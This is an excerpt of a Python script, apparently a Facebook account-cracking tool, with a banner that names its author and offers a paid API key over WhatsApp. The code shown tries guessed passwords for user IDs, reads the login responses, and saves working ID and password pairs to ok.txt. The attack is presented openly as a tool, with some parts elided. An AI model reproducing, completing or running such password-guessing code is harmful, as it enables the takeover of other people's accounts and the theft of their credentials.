...
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : USMAN AFRIDI
\033[1;93m(!)\033[1;97m Github   : https://github.com/Usmanafridi
\033[1;93m(!)\033[1;97m Fb Page  : https://www.facebook.com/profile.php?id=100042965112748
\033[1;93m(!)\033[1;97m Api Key  : For Key whatsapp 03139766088
\033[1;97m--------------------------------------------------
"""
		...
		try:
			...
			if "loc" in q:
				...
				if "www.facebook.com" in q["error"]:
					print("\033[1;91m[UsmanAfridi] "+uid+" | "+pass1)
					ok = open("ok.txt","a")
					ok.write(uid+" | "+pass1+"\n")
					ok.close()
					oks.append(uid+pass1)
					...
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;92m[UsmanAfridi] \033[1;96m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt","a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print("\033[1;91m[UsmanAfridi] "+uid+" | "+pass2)
							ok = open("ok.txt","a")
							ok.write(uid+" | "+pass2+"\n")
							ok.close()
							oks.append(uid+pass2)
